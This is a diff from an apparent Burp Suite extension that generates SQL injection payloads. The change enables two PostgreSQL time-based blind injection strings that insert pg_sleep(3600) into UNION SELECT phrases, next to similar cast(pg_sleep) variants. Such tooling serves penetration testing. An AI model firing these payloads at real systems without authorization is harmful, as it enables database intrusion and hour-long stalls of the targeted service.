@@ -477,11 +477,11 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                                     if not escapeChar:
                                         listSQLi.append(prefix + unionPhrase + "\n")
                                     if self._cbTimeBased.isSelected():
-                                        #listSQLi.append(prefix + escapeChar + unionPhrase.replace("select null", "select (select 1337 from pg_sleep(3600))") + suffix + "\n")
+                                        listSQLi.append(prefix + escapeChar + unionPhrase.replace("select null", "select (select 1337 from pg_sleep(3600))") + suffix + "\n")
                                         listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select cast(pg_sleep(3600) as text)") + suffix + "\n")
                                         listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select cast(pg_sleep(3600) as integer)") + suffix + "\n")
                                         if not escapeChar:
-                                            #listSQLi.append(prefix + unionPhrase.replace("select null", "select (select 1337 from pg_sleep(3600))") + "\n")
+                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select (select 1337 from pg_sleep(3600))") + "\n")
                                             listSQLi.append(prefix + unionPhrase.replace("select " + union, "select cast(pg_sleep(3600) as text)") + "\n")
                                             listSQLi.append(prefix + unionPhrase.replace("select " + union, "select cast(pg_sleep(3600) as integer)") + "\n")
                                 if self._cbMssqlBased.isSelected():
